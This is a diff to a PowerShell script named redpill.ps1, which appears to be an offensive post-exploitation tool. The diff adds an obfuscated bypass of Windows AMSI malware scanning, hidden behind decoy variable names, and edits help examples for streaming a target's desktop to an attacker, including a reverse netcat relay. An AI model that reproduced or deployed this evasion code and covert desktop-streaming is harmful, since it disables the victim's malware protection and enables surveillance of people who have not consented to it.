@@ -143,6 +143,22 @@ Write-Host "$Banner" -ForegroundColor Blue
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
 
 
+try {
+
+   <#
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - 'AmsiStringDetectionBypass'
+   #>
+
+   $MsTeamsId = "4456625220575263174452554847"
+   $Drawing = "Sy@ste£.M@ana"+"ge£e@nt"+".Auto@£ati@on."+"A£s@i"+"U@ti@ls" -Join ''
+   $imgForm = $Drawing.Replace("@","").Replace("£","m");$Bitmap = [Ref].Assembly.GetType($imgForm)
+   $Graphics = [string](0..13|%{[char][int](53+($MsTeamsId).substring(($_*2),2))}) -Replace ' '
+   $i0Stream = $Bitmap.GetField($Graphics,'NonPublic,Static');$i0Stream.SetValue($null,$true)
+}catch{}
+
+
 If($Help -ieq "Parameters"){
 
    <#
@@ -4887,7 +4903,7 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 4321 -Timmer 25
       Start target desktop live streamimg on port 4321 tcp for 25 seconds time!
-      Access stream on attacker: http://<target_ip>:4321 OR http://127.0.0.1:4321
+      Access live stream on attacker firefox webbrowser: http://<target_ip>:4321
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -LiveStream Bind -Port 1234 -Timmer 0
@@ -4897,7 +4913,7 @@ $HelpParameters = @"
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -LiveStream Reverse -IpAddress 192.168.1.73 -Port 4444
       Remark: Then execute this netcat cmdline on attacker side: [ nc -nlvp 4444 | nc -nlvp 9000 ]
-      Access stream on attacker firefox browser: http://192.168.1.73:9000
+      Access live stream on attacker firefox webbrowser: http://192.168.1.73:9000 (attacker ip:port)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -LiveStream Stop
